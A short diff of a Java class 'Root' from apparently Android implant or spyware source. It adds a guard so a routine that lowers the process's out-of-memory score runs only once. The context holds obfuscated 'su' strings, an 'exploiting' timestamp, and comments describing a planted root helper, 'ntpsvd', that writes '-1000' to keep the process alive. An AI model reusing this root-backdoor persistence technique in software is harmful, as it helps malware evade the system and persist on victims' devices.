@@ -42,6 +42,7 @@ public class Root {
 	public static String method = "";
 	public static Date startExploiting = new Date();
 	private static int askedSu = 0;
+	private static boolean oom_adjusted;
 	private final static String SU = M.e("su");
 
 	static public boolean isNotificationNeeded() {
@@ -193,7 +194,13 @@ public class Root {
 
 			return;
 		}
+		
+		if(oom_adjusted){
+			return;
+		}
 
+		oom_adjusted = true;
+		
 		int pid = android.os.Process.myPid();
 		// 32_34=#!/system/bin/sh
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
@@ -750,7 +757,7 @@ public class Root {
 		} else {
 			Configuration.shellFile = Configuration.shellFileBase;
 		}
-
+		
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 
